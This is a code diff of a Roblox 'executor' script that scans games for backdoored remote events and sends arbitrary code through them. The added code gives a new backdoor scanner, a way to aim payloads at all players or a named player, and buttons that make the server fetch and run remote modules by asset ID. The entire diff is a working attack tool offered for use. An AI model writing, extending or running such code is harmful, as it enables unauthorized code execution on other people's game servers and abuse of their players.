@@ -1,53 +1,50 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
 local foundRemote = nil
 local injected = false
 
-local function findBackdoor()
-    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-    local function randomName(length)
-        local name = ""
-        for i = 1, length do
-            local rand = math.random(1, #chars)
-            name = name .. chars:sub(rand, rand)
-        end
-        return name
-    end
+local function scanForBackdoors()
+    local foundRemotes = {}
+    local markerId = "Marker_" .. tostring(math.random(100000,999999))
     
-    for _, parent in ipairs({Workspace, ReplicatedStorage, game:GetService("Players"), game:GetService("Lighting"), game:GetService("ServerScriptService"), game:GetService("ServerStorage")}) do
-        for _, remote in ipairs(parent:GetDescendants()) do
-            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
-                local testName = randomName(10)
-                local payloads = {
-                    'local p = Instance.new("Part"); p.Name = "'..testName..'"; p.Parent = workspace; task.wait(0.5); p:Destroy()',
-                    'Instance.new("Part", workspace).Name = "'..testName..'"',
-                    'game:GetService("Workspace"):FindFirstChild("'..testName..'") or Instance.new("Part", workspace).Name = "'..testName..'"'
-                }
-                
-                for _, payload in ipairs(payloads) do
-                    local success = pcall(function()
-                        if remote:IsA("RemoteEvent") then
-                            remote:FireServer(payload)
-                        else
-                            remote:InvokeServer(payload)
-                        end
-                    end)
-                    
-                    if success then
-                        task.wait(0.7)
-                        local check = Workspace:FindFirstChild(testName)
-                        if check then
-                            check:Destroy()
-                            return remote
-                        end
-                    end
+    for _, obj in pairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            if obj.Parent == game:GetService("ReplicatedStorage") then
+                if obj.Name == "DefaultChatSystemChatEvents" then
+                    continue
                 end
+                if obj.Parent.Name == "DefaultChatSystemChatEvents" then
+                    continue
+                end
+                if string.find(obj:GetFullName(), "RobloxReplicatedStorage") then
+                    continue
+                end
+                
+                local testCommand = "print('It worked! Wow.')"
+                
+                if obj:IsA("RemoteEvent") then
+                    obj:FireServer(testCommand)
+                else
+                    spawn(function()
+                        pcall(function() obj:InvokeServer(testCommand) end)
+                    end)
+                end
+                
+                table.insert(foundRemotes, obj)
             end
         end
     end
+    
+    wait(1)
+    
+    for _, remote in pairs(foundRemotes) do
+        return remote
+    end
+    
     return nil
 end
 
@@ -66,6 +63,15 @@ local function sendCode(code)
     end
 end
 
+local function getPlayerFromName(name)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name:lower() == name:lower() or player.DisplayName:lower() == name:lower() then
+            return player
+        end
+    end
+    return nil
+end
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "Curse"
 screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
@@ -73,7 +79,7 @@ screenGui.ResetOnSpawn = false
 
 local Frame = Instance.new("Frame")
 Frame.Size = UDim2.new(0, 400, 0, 260)
-Frame.Position = UDim2.new(0.5, -210, 0.5, -130)
+Frame.Position = UDim2.new(0.5, -210, 0.5, -150)
 Frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 Frame.BorderSizePixel = 0
 Frame.Parent = screenGui
@@ -179,7 +185,7 @@ injectCorner.Parent = inject
 
 local hubFrame = Instance.new("Frame")
 hubFrame.Size = UDim2.new(0, 160, 0, 260)
-hubFrame.Position = UDim2.new(0, Frame.AbsolutePosition.X + Frame.Size.X.Offset + 5, 0, Frame.AbsolutePosition.Y)
+hubFrame.Position = UDim2.new(0, Frame.AbsolutePosition.X + Frame.Size.X.Offset + 10, 0, Frame.AbsolutePosition.Y)
 hubFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 hubFrame.BorderSizePixel = 0
 hubFrame.Parent = screenGui
@@ -191,6 +197,48 @@ hubGrad.Color = gradient.Color
 hubGrad.Rotation = 180
 hubGrad.Parent = hubFrame
 
+local function createMovingOutline(target)
+    local out = Instance.new("Frame")
+    out.BackgroundTransparency = 0
+    out.BorderSizePixel = 0
+    out.ZIndex = math.max(0, (target.ZIndex or 1) - 1)
+    out.Parent = screenGui
+    local outCorner = Instance.new("UICorner")
+    outCorner.CornerRadius = UDim.new(0, 14)
+    outCorner.Parent = out
+    local grad = Instance.new("UIGradient")
+    grad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(0,0,0)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255,255,255)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(0,0,0))
+    }
+    grad.Rotation = 0
+    grad.Parent = out
+    task.spawn(function()
+        while out.Parent and target.Parent do
+            for i = 0, 360, 2 do
+                grad.Rotation = i
+                task.wait(0.02)
+            end
+            task.wait(0.01)
+        end
+    end)
+    RunService.RenderStepped:Connect(function()
+        if not target.Parent then
+            out:Destroy()
+            return
+        end
+        local absPos = target.AbsolutePosition
+        local absSize = target.AbsoluteSize
+        out.Position = UDim2.new(0, absPos.X - 3, 0, absPos.Y - 3)
+        out.Size = UDim2.new(0, absSize.X + 6, 0, absSize.Y + 6)
+    end)
+    return out
+end
+
+local outline1 = createMovingOutline(Frame)
+local outline2 = createMovingOutline(hubFrame)
+
 local scrollFrame = Instance.new("ScrollingFrame")
 scrollFrame.Size = UDim2.new(1, -10, 1, -10)
 scrollFrame.Position = UDim2.new(0, 5, 0, 5)
@@ -200,6 +248,72 @@ scrollFrame.ScrollBarThickness = 6
 scrollFrame.CanvasSize = UDim2.new(0, 0, 6, 0)
 scrollFrame.Parent = hubFrame
 
+local targetLabel = Instance.new("TextLabel")
+targetLabel.Text = "All, Player name"
+targetLabel.Size = UDim2.new(1, -10, 0, 20)
+targetLabel.Position = UDim2.new(0, 5, 0, 1320)
+targetLabel.BackgroundTransparency = 1
+targetLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetLabel.TextSize = 14
+targetLabel.Font = Enum.Font.Fantasy
+targetLabel.TextXAlignment = Enum.TextXAlignment.Left
+targetLabel.Parent = scrollFrame
+
+local targetBox = Instance.new("TextBox")
+targetBox.Size = UDim2.new(1, -10, 0, 30)
+targetBox.Position = UDim2.new(0, 5, 0, 1345)
+targetBox.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+targetBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetBox.ClearTextOnFocus = false
+targetBox.PlaceholderText = "all or player name"
+targetBox.Text = "all"
+targetBox.Font = Enum.Font.Code
+targetBox.TextSize = 16
+targetBox.Parent = scrollFrame
+local targetCorner = Instance.new("UICorner")
+targetCorner.CornerRadius = UDim.new(0, 8)
+targetCorner.Parent = targetBox
+
+local hubExecute = Instance.new("TextButton")
+hubExecute.Size = UDim2.new(1, -10, 0, 40)
+hubExecute.Position = UDim2.new(0, 5, 0, 1385)
+hubExecute.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+hubExecute.Text = "Execute"
+hubExecute.Font = Enum.Font.Fantasy
+hubExecute.TextSize = 18
+hubExecute.TextColor3 = Color3.fromRGB(255, 255, 255)
+hubExecute.Parent = scrollFrame
+local hubExecCorner = Instance.new("UICorner")
+hubExecCorner.CornerRadius = UDim.new(0, 8)
+hubExecCorner.Parent = hubExecute
+
+local function sendToTarget(code)
+    local target = targetBox.Text:lower()
+    if target == "all" then
+        for _, player in pairs(Players:GetPlayers()) do
+            local modifiedCode = string.gsub(code, '"[^"]*"', function(match)
+                if string.find(match, LocalPlayer.Name) then
+                    return string.gsub(match, LocalPlayer.Name, player.Name)
+                end
+                return match
+            end)
+            sendCode(modifiedCode)
+        end
+    else
+        local player = getPlayerFromName(target)
+        if player then
+            local modifiedCode = string.gsub(code, '"[^"]*"', function(match)
+                if string.find(match, LocalPlayer.Name) then
+                    return string.gsub(match, LocalPlayer.Name, player.Name)
+                end
+                return match
+            end)
+            sendCode(modifiedCode)
+        end
+    end
+end
+
+local currentCode = ""
 local function makeButton(name, yPos, code)
  local btn = Instance.new("TextButton")
  btn.Size = UDim2.new(1, -10, 0, 40)
@@ -215,7 +329,8 @@ local function makeButton(name, yPos, code)
  btnCorner.Parent = btn
  btn.MouseButton1Click:Connect(function()
   if injected then
-   sendCode(code)
+   currentCode = code
+   sendToTarget(code)
   end
  end)
 end
@@ -272,6 +387,18 @@ y = y + 45
 makeButton("SSP", y, 'require(16920033857)("'..LocalPlayer.Name..'")')
 y = y + 45
 makeButton("Neko Yourself", y, 'require(3626787481).neko("'..LocalPlayer.Name..'")')
+y = y + 45
+makeButton("Artic | Pload Remake", y, 'require(100862513257291):Fire("'..LocalPlayer.Name..'")')
+y = y + 45
+makeButton("HD Admin Ranker", y, 'require(7192763922).load("'..LocalPlayer.Name..'")')
+y = y + 45
+makeButton("Serverside.fun", y, 'require(91127800424822).SF("'..LocalPlayer.Name..'")')
+
+hubExecute.MouseButton1Click:Connect(function()
+ if injected and currentCode ~= "" then
+  sendToTarget(currentCode)
+ end
+end)
 
 execute.MouseButton1Click:Connect(function()
  local scriptText = textBox.Text
@@ -286,18 +413,18 @@ end)
 
 inject.MouseButton1Click:Connect(function()
  if not injected then
-  foundRemote = findBackdoor()
+  foundRemote = scanForBackdoors()
   if foundRemote then
    injected = true
    inject.Text = "Injected"
-   sendCode('local h = Instance.new("Hint"); h.Text = "Project Curse v2.4.6 we hope you enjoy this executor | Thank you for using."; h.Parent = workspace; task.wait(10); h:Destroy()')
+   sendCode('local h = Instance.new("Hint"); h.Text = "Executor made by CurseDew! We hope you enjoy this executor | Thank you for using."; h.Parent = workspace; task.wait(10); h:Destroy()')
   end
  end
 end)
 
 r6.MouseButton1Click:Connect(function()
  if injected then
-  sendCode('require(9635947635).load("'..LocalPlayer.Name..'")')
+  sendToTarget('require(9635947635).load("'..LocalPlayer.Name..'")')
  end
 end)
 
@@ -337,3 +464,4 @@ warn("Testing warn")
 --Code by Curse (Yaazkidd lmao why do I need to!!)
 --My Dizcord: teamdbq
 --Also thanks to Syntex for giving me another backdoor code. Appreciate it.
+--Changed, Sunday, 12 October. I have changed the injection code and added some misc things, stay tune <3
